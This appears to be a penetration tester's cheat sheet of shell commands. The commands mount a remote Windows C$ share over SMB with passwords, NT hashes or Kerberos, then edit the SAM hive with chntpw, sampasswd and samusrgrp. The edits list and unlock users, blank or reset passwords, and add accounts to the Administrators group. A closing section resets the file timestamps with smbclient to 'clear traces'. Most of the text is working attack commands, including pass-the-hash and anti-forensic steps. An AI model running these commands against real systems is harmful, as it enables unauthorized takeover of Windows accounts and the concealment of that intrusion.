# Unix Shell

## 01 - Mount Remote SMB

TODO: Test it

Take note of the timestamps to clear traces ahead of time.

```
$ smbclient -U "[<domain>/]<username>%<password>" //<IP>/C$ "allinfo /Windows/System32/config/SAM"

$ smbclient -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> //<IP>/C$ "allinfo /Windows/System32/config/SAM"
```

Create a temporary folder for mounting an SMB share.

```
# mkdir /mnt/share
```

Mount SMB share with various authentication methods.

```
# mount -t cifs -o [domain=<domain>,]username=<username>,password=<password>,rw //<IP>/C$ /mnt/share

# smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw

# mount -t cifs -o [domain=<domain>,]username=<username>,password=<nt_hash>,sec=ntlmssp,rw //<IP>/C$ /mnt/share

# mount -t cifs -o sec=krb5,vers=3.0,rw '//<IP>/C$' /mnt/share
```

## 02 - Enumerate Users from SAM HIVE File

```
# chntpw -l /mnt/share/Windows/System32/config/SAM

# sampasswd -l /mnt/share/Windows/System32/config/SAM
```

Enumerate groups.

```
# samusrgrp -l /mnt/share/Windows/System32/config/SAM
```

Enumerate users with groups.

```
# samusrgrp -L /mnt/share/Windows/System32/config/SAM
```

Check any of the usernames are locked.

```
# samunlock -l /mnt/share/Windows/System32/config/SAM
```

## 03 - Unlock Users from SAM HIVE File

```
# samunlock -U -u <username> /mnt/share/Windows/System32/config/SAM
```

## 04 - Reset Password from SAM HIVE File

Specify local username to reset password.

```
# chntpw -u <username> /mnt/share/Windows/System32/config/SAM

Remove password from current username

Select: [q] > 1

Add username with administrator privileges.

Select: [q] > 3

Save changes

Select: [q] > q

Hives that have changed:
 #   Name
 0   <SAM>
Write hive files? (y/n) [n] : y
 0 <SAM> - OK
```

Even `sampasswd` will work as well.

```
# sampasswd -r -u <username> /mnt/share/Windows/System32/config/SAM
```

## 05 - Add Users in the group from SAM HIVE File

```
# samusrgrp -a -u <username> -g <group_ID> /mnt/share/Windows/System32/config/SAM
```

Append user in the users group.

```
# samusrgrp -a -u <username> -g 0x221 /mnt/share/Windows/System32/config/SAM
```

Append user in the administrators group.

```
# samusrgrp -a -u <username> -g 0x220 /mnt/share/Windows/System32/config/SAM
```

## 06 - Clear traces from SAM HIVE File

```
$ smbclient -U "[<domain>/]<username>%<password>" //<IP>/C$ "utimes /Windows/System32/config/SAM [YY]YY:MM:DD-hh:mm:ss [YY]YY:MM:DD-hh:mm:ss [YY]YY:MM:DD-hh:mm:ss [YY]YY:MM:DD-hh:mm:ss"

smbclient -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> //<IP>/C$ "utimes /Windows/System32/config/SAM [YY]YY:MM:DD-hh:mm:ss [YY]YY:MM:DD-hh:mm:ss [YY]YY:MM:DD-hh:mm:ss [YY]YY:MM:DD-hh:mm:ss"
```

---
## References

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x00 - Exploitation/0xG - Physical Pentesting/Reset Password/Windows/Live Removable Media]]